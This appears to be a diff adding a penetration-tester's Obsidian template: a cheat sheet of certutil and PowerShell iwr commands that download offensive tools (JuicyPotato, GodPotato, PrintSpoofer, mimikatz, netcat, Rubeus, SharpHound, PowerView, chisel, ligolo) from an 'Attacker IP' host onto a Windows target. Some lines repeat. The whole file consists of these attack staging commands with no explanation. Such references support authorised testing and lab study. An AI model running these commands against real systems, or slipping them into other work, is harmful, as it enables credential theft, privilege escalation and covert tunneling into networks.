@@ -1,0 +1,34 @@
+## 1. Certutil
+```bash
+certutil -urlcache -f -split http://<% tp.frontmatter["Attacker IP"] %>/JuicyPotato.exe JuicyPotato.exe 
+certutil -urlcache -f -split http://<% tp.frontmatter["Attacker IP"] %>/GodPotato-NET4.exe GodPotato-NET4.exe
+certutil -urlcache -f -split http://<% tp.frontmatter["Attacker IP"] %>/PrintSpoofer64.exe PrintSpoofer64.exe
+certutil -urlcache -f -split http://<% tp.frontmatter["Attacker IP"] %>/nc.exe nc.exe
+certutil -urlcache -f -split http://<% tp.frontmatter["Attacker IP"] %>/mimikatz.exe mimikatz.exe
+certutil -urlcache -f -split http://<% tp.frontmatter["Attacker IP"] %>/winPEASx64.exe winPEASx64.exe
+certutil -urlcache -f -split http://<% tp.frontmatter["Attacker IP"] %>/SharpHound.exe SharpHound.exe 
+certutil -urlcache -f -split http://<% tp.frontmatter["Attacker IP"] %>/Rubeus.exe rubeus.exe
+certutil -urlcache -f -split http://<% tp.frontmatter["Attacker IP"] %>/PowerView.ps1 PowerView.ps1
+certutil -urlcache -f -split http://<% tp.frontmatter["Attacker IP"] %>/chisel/windows/chiselx64.exe chisel.exe
+certutil -urlcache -f -split http://<% tp.frontmatter["Attacker IP"] %>/ligolo/win-agent.exe agent.exe 
+certutil -urlcache -f -split http://<% tp.frontmatter["Attacker IP"] %>/SharpHound.exe SharpHound.exe 
+certutil -urlcache -f -split http://<% tp.frontmatter["Attacker IP"] %>/Rubeus.exe rubeus.exe
+certutil -urlcache -f -split http://<% tp.frontmatter["Attacker IP"] %>/winPEASx64.exe winPEASx64.exe 
+```
+## 2. IWR
+```bash
+iwr -uri http://<% tp.frontmatter["Attacker IP"] %>/JuicyPotato.exe -Outfile JuicyPotato.exe 
+iwr -uri http://<% tp.frontmatter["Attacker IP"] %>/GodPotato-NET4.exe -Outfile GodPotato-NET4.exe
+iwr -uri http://<% tp.frontmatter["Attacker IP"] %>/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
+iwr -uri http://<% tp.frontmatter["Attacker IP"] %>/nc.exe -Outfile nc.exe
+iwr -uri http://<% tp.frontmatter["Attacker IP"] %>/mimikatz.exe -Outfile mimikatz.exe
+iwr -uri http://<% tp.frontmatter["Attacker IP"] %>/winPEASx64.exe -Outfile winPEASx64.exe
+iwr -uri http://<% tp.frontmatter["Attacker IP"] %>/SharpHound.exe -Outfile SharpHound.exe 
+iwr -uri http://<% tp.frontmatter["Attacker IP"] %>/Rubeus.exe -Outfile rubeus.exe
+iwr -uri http://<% tp.frontmatter["Attacker IP"] %>/PowerView.ps1 -Outfile PowerView.ps1
+iwr -uri http://<% tp.frontmatter["Attacker IP"] %>/chisel/windows/chiselx64.exe -Outfile chisel.exe
+iwr -uri http://<% tp.frontmatter["Attacker IP"] %>/ligolo/win-agent.exe -Outfile agent.exe 
+iwr -uri http://<% tp.frontmatter["Attacker IP"] %>/SharpHound.exe -Outfile SharpHound.exe 
+iwr -uri http://<% tp.frontmatter["Attacker IP"] %>/Rubeus.exe -Outfile rubeus.exe
+iwr -uri http://<% tp.frontmatter["Attacker IP"] %>/winPEASx64.exe -Outfile winPEASx64.exe 
+```
